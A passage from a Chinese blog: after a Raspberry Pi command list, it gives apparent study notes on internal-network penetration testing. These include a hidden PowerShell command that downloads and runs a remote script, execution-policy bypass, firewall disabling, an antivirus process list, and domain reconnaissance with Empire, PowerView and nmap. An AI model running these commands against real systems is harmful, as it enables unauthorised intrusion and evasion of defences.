<h4 id="rspi常用指令："><a href="#rspi常用指令：" class="headerlink" title="rspi常用指令："></a>rspi常用指令：</h4><p>查看cpu温度<!-- more --></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcgencmd measure_temp</span><br></pre></td></tr></table></figure>

<p>查看cpu信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lscpu</span><br></pre></td></tr></table></figure>
<p>查看内存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure>
<p>查看磁盘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsblk</span><br><span class="line"></span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure>
<p>查看更多硬件信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dmesg | more</span><br></pre></td></tr></table></figure>
<p>查看时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure>
<p>查看树莓派型号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;device-tree&#x2F;model</span><br></pre></td></tr></table></figure>
<p>查看树莓派系统位数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getconf LONG_BIT</span><br><span class="line"></span><br><span class="line">file &#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure>
<p>查看usb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure>
<p>查看其他硬件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
<p>查看CPU的时钟频率</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcgencmd get_config arm_freq</span><br><span class="line"></span><br><span class="line">cat &#x2F;sys&#x2F;devices&#x2F;system&#x2F;cpu&#x2F;cpu0&#x2F;cpufreq&#x2F;scaling_cur_freq</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>留着玩的</category>
      </categories>
  </entry>
  <entry>
    <title>内网安全攻防</title>
    <url>/2020/04/28/pentest/</url>
    <content><![CDATA[<p>原作者：<a href="https://github.com/ambitionxm/Pentest-Notes" target="_blank" rel="noopener">https://github.com/ambitionxm/Pentest-Notes</a><br><code>整理一下</code></p>
<a id="more"></a>
<h1 id="第一章-内网渗透测试基础"><a href="#第一章-内网渗透测试基础" class="headerlink" title="第一章 内网渗透测试基础"></a>第一章 内网渗透测试基础</h1><h2 id="Windows-Powershell基础"><a href="#Windows-Powershell基础" class="headerlink" title="Windows Powershell基础"></a>Windows Powershell基础</h2><p>查看Powershell版本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVERSION</span><br></pre></td></tr></table></figure>

<p><img src="1_1.png" alt=""></p>
<p>执行策略：</p>
<p>在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted</span><br></pre></td></tr></table></figure>

<p><img src="1_2.png" alt=""></p>
<p>策略共四种:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Restricted：脚本不能运行</span><br><span class="line">RemoteSigned：本地可以运行</span><br><span class="line">AllSigned：仅当脚本由受信任的发布者签名时才能运行</span><br><span class="line">Unrestricted：允许所有脚本允许</span><br></pre></td></tr></table></figure>

<p>附加：</p>
<p>原文中提到运行脚本，可以使用.\a.ps1</p>
<p>如果是使用Import-Module加载脚本可以使用：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">. .\a.ps1</span><br></pre></td></tr></table></figure>

<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get-process p* | stop-process</span><br></pre></td></tr></table></figure>

<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新建目录：New-Item aaa -ItemType Directory（实际上在5.0版本可以直接通过md）</span><br><span class="line">新建文件:New-Item aaa.txt</span><br><span class="line">删除目录：Remove-Item aaa.txt可以直接使用rm</span><br><span class="line">显示文件内容：Get-Content可以直接使用cat</span><br><span class="line">设置文本内容：Set-Content aaa.txt -Value &quot;aaa&quot;</span><br><span class="line">追加内容:Add-Content aaa.txt -Value &quot;aaa&quot;</span><br></pre></td></tr></table></figure>

<p> 绕过本地权限执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure>

<p>上传之后执行：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-module C:\PowerUp.ps1;Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure>

<p>远程加载(此处原书中存在空格被吞的情况)：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowsStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoProfile</span> <span class="literal">-NonI</span> IEX(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"http://www.baidu.com/xxx.ps1"</span>);</span><br></pre></td></tr></table></figure>

<p>使用Base64编码对Powershell命令进行编码：</p>
<p>使用ps_encoder.py脚本加密（<a href="https://github.com/h4sh5/ps_encoder）：" target="_blank" rel="noopener">https://github.com/h4sh5/ps_encoder）：</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ps_encoder.py -s script.txt</span><br></pre></td></tr></table></figure>

<p><img src="1_3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -encodedCommand YwBhAGwAYwAuAGUAeABlAAoA</span><br></pre></td></tr></table></figure>

<p><img src="1_4.png" alt=""></p>
<p>搭建内网环境：省略</p>
<h1 id="第二章-内网信息收集"><a href="#第二章-内网信息收集" class="headerlink" title="第二章 内网信息收集"></a>第二章 内网信息收集</h1><h2 id="2-2收集本机信息"><a href="#2-2收集本机信息" class="headerlink" title="2.2收集本机信息"></a>2.2收集本机信息</h2><h3 id="1-查询网络配置命令："><a href="#1-查询网络配置命令：" class="headerlink" title="1.查询网络配置命令："></a>1.查询网络配置命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>

<h3 id="2-查询操作系统及软件的信息"><a href="#2-查询操作系统及软件的信息" class="headerlink" title="2.查询操作系统及软件的信息"></a>2.查询操作系统及软件的信息</h3><p>1）查看操作系统和版本信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">&#x2F;&#x2F;适用于英文的操作系统，中文的：</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>

<p><img src="2_1.png" alt=""></p>
<p>2）查看系统体系结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>

<p><img src="2_2.png" alt=""></p>
<p>3) 查看安装的软件及版本、路径等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<p><img src="2_3.png" alt=""></p>
<p>Powershell版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3-查询本机服务信息"><a href="#3-查询本机服务信息" class="headerlink" title="3.查询本机服务信息"></a>3.查询本机服务信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>

<p><img src="2_4.png" alt=""></p>
<h3 id="4-查询进程列表"><a href="#4-查询进程列表" class="headerlink" title="4.查询进程列表"></a>4.查询进程列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist</span><br><span class="line">&#x2F;&#x2F;或者</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>

<p><img src="2_5.png" alt=""></p>
<h4 id="常见杀毒软件进程"><a href="#常见杀毒软件进程" class="headerlink" title="常见杀毒软件进程"></a>常见杀毒软件进程</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">360sd.exe</span><br><span class="line">360tray.exe</span><br><span class="line">ZhuDongFangYu.exe</span><br><span class="line">KSafeTray.exe</span><br><span class="line">SafeDogUpdateCenter.exe</span><br><span class="line">McAfee McShield.exe</span><br><span class="line">egui.exe &#x2F;&#x2F;NOD32</span><br><span class="line">AVP.EXE  &#x2F;&#x2F;卡巴斯基</span><br><span class="line">avguard.exe		&#x2F;&#x2F;小红伞</span><br><span class="line">bdagent.exe		&#x2F;&#x2F;BitDefender</span><br></pre></td></tr></table></figure>

<h3 id="5-查看启动程序信息"><a href="#5-查看启动程序信息" class="headerlink" title="5.查看启动程序信息"></a>5.查看启动程序信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>

<p><img src="2_6.png" alt=""></p>
<h3 id="6-查看计划任务"><a href="#6-查看计划任务" class="headerlink" title="6.查看计划任务"></a>6.查看计划任务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<h3 id="7-查看主机开机时间"><a href="#7-查看主机开机时间" class="headerlink" title="7.查看主机开机时间"></a>7.查看主机开机时间</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>

<h3 id="8-查询用户列表"><a href="#8-查询用户列表" class="headerlink" title="8.查询用户列表"></a>8.查询用户列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">&#x2F;&#x2F;获取本地管理员组成员：</span><br><span class="line">net localgroup adinistrators</span><br><span class="line">&#x2F;&#x2F;查看当前再线用户</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<h3 id="9-列出或断开本地计算机与所连接的客户端之间的会话"><a href="#9-列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="9.列出或断开本地计算机与所连接的客户端之间的会话"></a>9.列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>

<h3 id="10-查询端口列表"><a href="#10-查询端口列表" class="headerlink" title="10.查询端口列表"></a>10.查询端口列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<h3 id="11-查询补丁列表"><a href="#11-查询补丁列表" class="headerlink" title="11.查询补丁列表"></a>11.查询补丁列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<h3 id="12-查询本机共享列表"><a href="#12-查询本机共享列表" class="headerlink" title="12.查询本机共享列表"></a>12.查询本机共享列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share</span><br><span class="line">&#x2F;&#x2F;wmic:</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>

<h3 id="13-查询路由表及所有可用接口的ARP缓存表"><a href="#13-查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="13.查询路由表及所有可用接口的ARP缓存表"></a>13.查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h3 id="14-查询防火墙相关配置"><a href="#14-查询防火墙相关配置" class="headerlink" title="14.查询防火墙相关配置"></a>14.查询防火墙相关配置</h3><h4 id="1）关闭防火墙"><a href="#1）关闭防火墙" class="headerlink" title="1）关闭防火墙"></a>1）关闭防火墙</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;windows server 2003之前</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line">&#x2F;&#x2F;Windows server 2003之后</span><br><span class="line">netsh advfirewall set allprofile state off</span><br></pre></td></tr></table></figure>

<h4 id="2）查看防火墙配置"><a href="#2）查看防火墙配置" class="headerlink" title="2）查看防火墙配置"></a>2）查看防火墙配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>

<h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;windows server 2003之前允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">&#x2F;&#x2F;windows server 2003之后的版本</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;允许指定程序退出</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4)自定义防火墙日志的存储位置"></a>4)自定义防火墙日志的存储位置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure>

<h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure>

<h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1）查看远程连接端口"><a href="#1）查看远程连接端口" class="headerlink" title="1）查看远程连接端口"></a>1）查看远程连接端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure>

<h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2)在Windows server 2003中开启3389"></a>2)在Windows server 2003中开启3389</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>

<h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3)在Windows server 2008和2012中"></a>3)在Windows server 2008和2012中</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br><span class="line">&#x2F;&#x2F;修改注册表方式</span><br><span class="line">reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p>
<h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;host&#x2F;winenum</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;all</span><br></pre></td></tr></table></figure>

<p>查询指定用户的详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user xxx &#x2F;domain</span><br></pre></td></tr></table></figure>

<h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">&#x2F;&#x2F;将查看到的DNS服务器用nslookup进行解析</span><br><span class="line">nslookup dc.test.local</span><br></pre></td></tr></table></figure>

<p>查看系统详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;登录服务器&quot;</span><br><span class="line">&#x2F;&#x2F;如果结果不为&quot;WORKGROUP&quot;则主机为域主机</span><br></pre></td></tr></table></figure>

<p>查询当前登录域及登录用户信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group workstation</span><br></pre></td></tr></table></figure>

<p>判断主域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;命令用于查看域内时间，同时也可以查看域控制器</span><br></pre></td></tr></table></figure>

<h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan<code>(http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbt.exe 192.168.1.0&#x2F;20</span><br></pre></td></tr></table></figure>

<p>使用ICMP探测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="2_7.png" alt=""></p>
<p>通过ARPscan工具扫描探测内网</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arp.exe -t 192.168.1.0&#x2F;20</span><br></pre></td></tr></table></figure>

<p>Empire中的ARPscan模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemode situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>Nishang中的Invoke-ARPScan.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;20)&quot; &gt;&gt; c:\windows\temp\log.txt</span><br><span class="line">type c:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>

<p>通过常规的TCP/UDP端口扫描探测内网</p>
<p>上传ScanLine进行扫描：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scanline -h -t 22,80-90,110,445 -u 53,161 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure>

<h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p>
<p>S扫描器</p>
<p>Metasploit端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set ports 1-1000</span><br><span class="line">set RHOST 192.168.1.1</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>PowerSploit、NiShang的Invoke-portscan脚本</p>
<h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;查询域</span><br><span class="line"></span><br><span class="line">net view &#x2F;domain:test</span><br><span class="line">&#x2F;&#x2F;查询域内所有计算机</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;查询域内所有用户组列表</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;查询所有域成员计算机列表</span><br><span class="line"></span><br><span class="line">net accounts &#x2F;domain</span><br><span class="line">&#x2F;&#x2F;获取域内密码信息</span><br><span class="line"></span><br><span class="line">nltest &#x2F;domain_trusts</span><br><span class="line">&#x2F;&#x2F;域内信任信息</span><br></pre></td></tr></table></figure>

<h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:test</span><br><span class="line"></span><br><span class="line">net time &#x2F;domain</span><br><span class="line"></span><br><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line"></span><br><span class="line">netdom query pdc</span><br><span class="line">&#x2F;&#x2F;查看主控制器</span><br></pre></td></tr></table></figure>

<h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询所有域用户列表</span><br><span class="line">net user &#x2F;domain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;获取域内用户的详细信息</span><br><span class="line">wmic useraccount get &#x2F;all</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在</span><br><span class="line">dsquery user</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查找目录中的计算机</span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询本地管理员组用户</span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询域管理员用户组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查询管理员用户组</span><br><span class="line">net group &quot;Enterprise Admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>

<h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统/主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p>
<h3 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h3><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p>
<p>下载地址：<code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psloggedon.exe \\dc2012</span><br></pre></td></tr></table></figure>

<p><img src="2_8.png" alt=""></p>
<h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p>
<p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：<a href="https://www.cr173.com/soft/921507.html" target="_blank" rel="noopener">https://www.cr173.com/soft/921507.html</a></p>
<p><img src="2_9.png" alt=""></p>
<p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" target="_blank" rel="noopener">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PVEFindADUser.exe -current</span><br></pre></td></tr></table></figure>

<p><img src="2_10.png" alt=""></p>
<h3 id="NetView"><a href="#NetView" class="headerlink" title="NetView"></a>NetView</h3><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p>
<p>下载地址：<a href="https://github.com/mubix/netview" target="_blank" rel="noopener">https://github.com/mubix/netview</a></p>
<h3 id="Netness"><a href="#Netness" class="headerlink" title="Netness"></a>Netness</h3><p>下载地址没找到</p>
<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>使用Powerview的Invoke-UserHunter。</p>
<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中也存在此类型的脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<h3 id="Nmap的NSE脚本"><a href="#Nmap的NSE脚本" class="headerlink" title="Nmap的NSE脚本"></a>Nmap的NSE脚本</h3><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p>
<p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p>
<p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p>
<p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p>
<h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><p>其中阿里云上有个链接也说到了类似的方法：<a href="https://yq.aliyun.com/articles/599377?type=2" target="_blank" rel="noopener">https://yq.aliyun.com/articles/599377?type=2</a></p>
<p>本机检查：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;获取域管理员列表</span><br><span class="line">net group &quot;Domain Admins&quot; &#x2F;domain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;列出本机的所有进程和进程用户</span><br><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>

<p>查询域控的域用户会话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询域控列表</span><br><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;收集所有活动域的会话列表</span><br><span class="line">netsess -h</span><br></pre></td></tr></table></figure>
<h1 id="第三章-隐藏通信隧道技术"><a href="#第三章-隐藏通信隧道技术" class="headerlink" title="第三章 隐藏通信隧道技术"></a>第三章 隐藏通信隧道技术</h1><h2 id="1-常用隧道"><a href="#1-常用隧道" class="headerlink" title="1:常用隧道"></a>1:常用隧道</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络层：</span><br><span class="line">IPv6隧道</span><br><span class="line">ICMP隧道</span><br><span class="line">GRE隧道</span><br><span class="line"></span><br><span class="line">传输层：</span><br><span class="line">TCP隧道</span><br><span class="line">UDP隧道</span><br><span class="line">常规端口转发</span><br><span class="line"></span><br><span class="line">应用层：</span><br><span class="line">SSH隧道</span><br><span class="line">HTTP隧道</span><br><span class="line">HTTPS隧道</span><br><span class="line">DNS隧道</span><br></pre></td></tr></table></figure>

